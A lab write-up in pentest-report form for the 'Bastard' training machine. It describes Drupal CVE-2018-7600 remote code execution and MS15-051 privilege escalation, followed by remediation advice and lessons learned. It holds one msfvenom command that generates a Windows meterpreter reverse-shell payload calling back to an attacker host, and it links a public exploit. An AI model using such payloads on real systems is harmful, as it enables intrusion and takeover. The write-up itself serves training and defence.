# Bastard – Please keep things updated!


## Introduction
This machine was a challenge box for the class Windows Privilege Escalation by TCM, done in preparation for the Practical Network Penetration Tester certification. In it a CMS vulnerability is highlighted for initial exploit and a privilege escalation technique is used which is the main goal of this box.


## Executive Summary
Through enumeration a webpage/site was found using the well know CMS Drupal. Investigating further reveals the exact version of Drupal which then leads to a known exploitable vulnerability (CVE-2018-7600) that allows for remote code execution (RCE) that can lead to a low level shell on the system. From this low level access more enumeration was performed, and multiple possible vulnerabilities were found due to the system not being updated. Privilege Escalation was achieved by using the vulnerability MS15-051.

## Initial Access
Utilizing Nmap, there were only a few open ports found on the system. Further investigation of the website open on port 80 revealed a website using Drupal in its creation. Combining this information with the robots.txt file’s disallowed entry of “/changelog.txt” reveals the exact version in use.

(image nmap)

(image changelog.txt)

With the exact Drupal version, an exploit was found that worked for it, utilizing a python script that performs a RCE on the system without any authentication required. The proof-of-concept code used to exploit the system resides here: https://github.com/pimps/CVE-2018-7600
Test commands were run before the exploit was used to download a reverse shell and execute for low level access to the system.

(image test commands)

(image shell exploit)

NOTE: meterpreter shell was used in exploit created using the command:

‘’’
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(attackIP) LPORT=(attackerPort) -f exe -o program.exe
‘’’


## Privilege Escalation

With meterpreter access to the system, the Local Exploit Suggester module of Metasploit was utilized to find potential vulnerabilities to escalate privileges with.

(image local_exploit_suggester)

From this list of potential vulnerabilities the Pentester attempted to use the Metasploit modules suggested without success, but was able to find a compiled exploit that allowed for elevated command execution from github that was successful using the vulnerability MS15-051.
As with the previous Drupal exploit, test commands were run before being used in the exact same way to execute a reverse shell that gave elevated access as nt authority/system.

(images of exploit and shell access)

(images of blurred flags)


## Suggested Mitigations and Remediations

### Drupal 7.54 (CVE-2018-7600)
Mitigation suggestions: This is a flaw within the specified versions of Drupal and not many mitigations can be done. It is suggested to remove the ability to see the changelog and other supporting documentation from view if possible to avoid revealing exact versions. This however is a minor fix and will not prevent an attack from exploiting the system.
Remediation suggestions: Update Drupal to the latest version. Keeping software updated to the latest version helps prevent known exploits from being ran as they usually are patched quickly once know.

### MS15-051 (https://learn.microsoft.com/en-us/security-updates/securitybulletins/2015/ms15-051)
No migitations are suggested as this is a flaw within the windows kernel that is exploited to run elevated commands.
Remediation suggestions: apply the latest security patches from Microsoft to remedy the exploit. It is also suggested that the system be upgraded to a newer version of Windows Server as Windows Server 2008 R2 has had support ended as of 1/14/2020 (https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-server-eos-faq/end-of-support-windows-server-2008-2008r2)


## Lessons Learned

(Note: personal musings, not part of report therefore will be in first person)

The biggest thing I learned from this box is to try EVERYTHING. If you know the system is vulnerable to multiple exploits, research them, and try them. And when one avenue doesn’t work try another. I don’t mean throw anything at a system without knowing what it will do to it. Make sure it won’t damage the system, and if there a possibility it will cause the system to crash etc, make sure the customer is okay with it.

However knowing that, explore your options. I tried ALL of the Metasploit modules suggested by the local suggester and was unable to have any of them work. The wonderful thing about todays world is that there is github with compiled exploits that can be used. I was able to find the exploit used on this box and run the elevated commands needed to get an elevated shell on the system, where I wasn’t able to with the Metasploit module for the exact same exploit.

Another thing to note is that I recently read an article after reviewing my first attempt at reporting to better write a report, which shows in this one as I changed the tone and view. The article is here: https://www.blackhillsinfosec.com/how-to-not-suck-at-reporting-or-how-to-write-great-pentesting-reports/ and was very helpful with useful information about writing a better report. Going forward I’ll attempt to right reports using these suggestions and when I get through my backlog of machine writes or get bored and feel up to it, I’ll rewrite my first report using these suggestions.
